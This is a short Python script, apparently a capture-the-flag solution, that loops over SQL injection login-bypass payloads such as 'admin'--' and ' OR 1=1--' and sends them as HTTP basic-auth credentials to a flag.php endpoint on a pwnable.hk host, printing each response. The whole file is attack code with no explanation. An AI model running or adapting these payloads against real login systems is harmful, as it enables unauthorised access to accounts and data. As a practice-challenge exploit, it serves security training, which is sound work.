import requests

combinations = [
    ["admin'--", ""],
    ["admin' OR 1=1--", ""],
    ["admin' OR '1'='1", ""],
    ["", "' OR 1=1--"]
]

for c in combinations:
    d = requests.get('http://secondary.pwnable.hk:50007/b5HCLDptFQ6ZIZzw/flag.php', auth=(c[0], c[1])).text
    if "Internal Server Error" not in d:
        print(d)
    else:
        print(d)